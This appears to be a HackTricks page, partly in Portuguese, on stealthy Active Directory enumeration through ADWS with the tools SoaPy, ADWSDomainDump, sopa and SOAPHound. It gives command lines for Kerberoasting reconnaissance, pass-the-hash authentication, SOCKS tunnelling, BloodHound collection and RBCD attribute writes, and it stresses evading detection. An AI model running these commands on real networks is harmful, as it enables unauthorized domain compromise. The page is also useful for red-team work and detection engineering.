# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**.  Despite the name, **no HTTP is involved**.  Instead, the service exposes LDAP-style data through a stack of proprietary .NET framing protocols:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Because the traffic is encapsulated inside these binary SOAP frames and travels over an uncommon port, **enumeration through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**.  For operators this means:

* Stealthier recon – Blue teams often concentrate on LDAP queries.
* Freedom to collect from **non-Windows hosts (Linux, macOS)** by tunnelling 9389/TCP through a SOCKS proxy.
* The same data you would obtain via LDAP (users, groups, ACLs, schema, etc.) and the ability to perform **writes** (e.g. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**).

ADWS interactions are implemented over WS-Enumeration: every query starts with an `Enumerate` message that defines the LDAP filter/attributes and returns an `EnumerationContext` GUID, followed by one or more `Pull` messages that stream up to the server-defined result window. Contexts age out after ~30 minutes, so tooling either needs to page results or split filters (prefix queries per CN) to avoid losing state. When asking for security descriptors, specify the `LDAP_SERVER_SD_FLAGS_OID` control to omit SACLs, otherwise ADWS simply drops the `nTSecurityDescriptor` attribute from its SOAP response.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy ships with curated switches that replicate the most common LDAP hunting tasks over ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knobs for custom pulls. Pair those with write primitives such as `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) and `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Use o mesmo host/credenciais para imediatamente explorar as descobertas: dump RBCD-capable objects with `--rbcds`, depois aplique `--rbcd 'WEBSRV01$' --account 'FILE01$'` para stage uma Resource-Based Constrained Delegation chain (veja [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para o caminho completo de abuso).

### Instalação (host do operador)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork do `ldapdomaindump` que troca consultas LDAP por chamadas ADWS em TCP/9389 para reduzir detecções por assinatura LDAP.
* Realiza uma verificação inicial de conectividade para 9389 a menos que `--force` seja passado (skips the probe if port scans are noisy/filtered).
* Testado contra Microsoft Defender for Endpoint e CrowdStrike Falcon com bypass bem-sucedido no README.

### Instalação
```bash
pipx install .
```
### Uso
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
A saída típica registra a verificação de conectividade da porta 9389, o ADWS bind e o início/fim do dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Um cliente prático para ADWS em Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Pesquisa e recuperação de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Edição de atributos** - `attr [add|replace|delete]`
* **Gerenciamento de contas** - `set-password` / `change-password`
* e outros como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Destaques do mapeamento do protocolo

* Buscas no estilo LDAP são realizadas via **WS-Enumeration** (`Enumerate` + `Pull`) com projeção de atributos, controle de escopo (Base/OneLevel/Subtree) e paginação.
* Recuperação de objeto único usa **WS-Transfer** `Get`; alterações de atributos usam `Put`; exclusões usam `Delete`.
* A criação incorporada de objetos usa **WS-Transfer ResourceFactory**; objetos personalizados usam um **IMDA AddRequest** guiado por modelos YAML.
* Operações de senha são ações **MS-ADCAP** (`SetPassword`, `ChangePassword`).

### Descoberta de metadados não autenticada (mex)

ADWS expõe WS-MetadataExchange sem credenciais, o que é uma maneira rápida de validar a exposição antes de autenticar:
```bash
sopa mex --dc <DC>
```
### Descoberta DNS/DC & notas sobre direcionamento Kerberos

Sopa pode resolver DCs via SRV se `--dc` for omitido e `--domain` for fornecido. Ele consulta nesta ordem e usa o alvo de maior prioridade:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operacionalmente, prefira um resolvedor controlado pelo DC para evitar falhas em ambientes segmentados:

* Use `--dns <DC-IP>` para que **todas** as buscas SRV/PTR/forward passem pelo DNS do DC.
* Use `--dns-tcp` quando UDP estiver bloqueado ou as respostas SRV forem grandes.
* Se Kerberos estiver habilitado e `--dc` for um IP, o sopa realiza um **PTR reverso** para obter um FQDN para o direcionamento correto de SPN/KDC. Se Kerberos não for usado, nenhuma busca PTR ocorre.

Example (IP + Kerberos, forced DNS via the DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opções de material de autenticação

Além de senhas em texto plano, sopa suporta **NT hashes**, **Kerberos AES keys**, **ccache**, e **PKINIT certificates** (PFX ou PEM) para ADWS auth. Kerberos é implícito ao usar `--aes-key`, `-c` (ccache) ou opções baseadas em certificado.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Criação de objetos personalizados via modelos

Para classes de objetos arbitrárias, o comando `create custom` consome um modelo YAML que mapeia para um IMDA `AddRequest`:

* `parentDN` e `rdn` definem o contêiner e o DN relativo.
* `attributes[].name` suporta `cn` ou namespaced `addata:cn`.
* `attributes[].type` aceita `string|int|bool|base64|hex` ou explícito `xsd:*`.
* Do **not** include `ad:relativeDistinguishedName` or `ad:container-hierarchy-parent`; sopa injects them.
* `hex` values are converted to `xsd:base64Binary`; use `value: ""` to set empty strings.

## SOAPHound – Coleta ADWS de Alto Volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) é um coletor .NET que mantém todas as interações LDAP dentro do ADWS e gera JSON compatível com BloodHound v4. Ele constrói um cache completo de `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` uma vez (`--buildcache`), e então o reutiliza para execuções de alto volume `--bhdump`, `--certdump` (ADCS), ou `--dnsdump` (DNS integrado ao AD) de modo que apenas ~35 atributos críticos saiam do DC. AutoSplit (`--autosplit --threshold <N>`) automaticamente segmenta as consultas por prefixo CN para permanecer abaixo do timeout EnumerationContext de 30 minutos em grandes florestas.

Fluxo de trabalho típico em uma VM de operador ingressada no domínio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exporte JSON diretamente para os workflows do SharpHound/BloodHound — veja [BloodHound methodology](bloodhound.md) para ideias de criação de gráficos posteriores. AutoSplit torna o SOAPHound resiliente em florestas com milhões de objetos, mantendo a contagem de consultas menor do que snapshots no estilo ADExplorer.

## Fluxo de Coleta AD Discreto

O fluxo a seguir mostra como enumerar **objetos de domínio & ADCS** via ADWS, convertê-los para BloodHound JSON e caçar caminhos de ataque baseados em certificados — tudo a partir do Linux:

1. **Crie um túnel para 9389/TCP** da rede alvo até sua máquina (por exemplo via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exporte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou use os parâmetros `--proxyHost/--proxyPort` do SoaPy.

2. **Colete o objeto do domínio raiz:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Coletar objetos relacionados ao ADCS do NC de Configuração:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converter para BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** na GUI do BloodHound e execute consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar caminhos de escalonamento de certificados (ESC1, ESC8, etc.).

### Escrevendo `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine isso com `s4u2proxy`/`Rubeus /getticket` para uma cadeia completa de **Resource-Based Constrained Delegation** (veja [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumo de Ferramentas

| Propósito | Ferramenta | Observações |
|---------|------|-------|
| Enumeração ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/escrita |
| Dump ADWS de alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modos BH/ADCS/DNS |
| Ingestão para BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de certificado | [Certipy](https://github.com/ly4k/Certipy) | Pode ser encaminhado através do mesmo SOCKS |
| Enumeração ADWS e alterações de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interagir com endpoints ADWS conhecidos - permite enumeração, criação de objetos, modificações de atributos e alteração de senhas |

## Referências

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
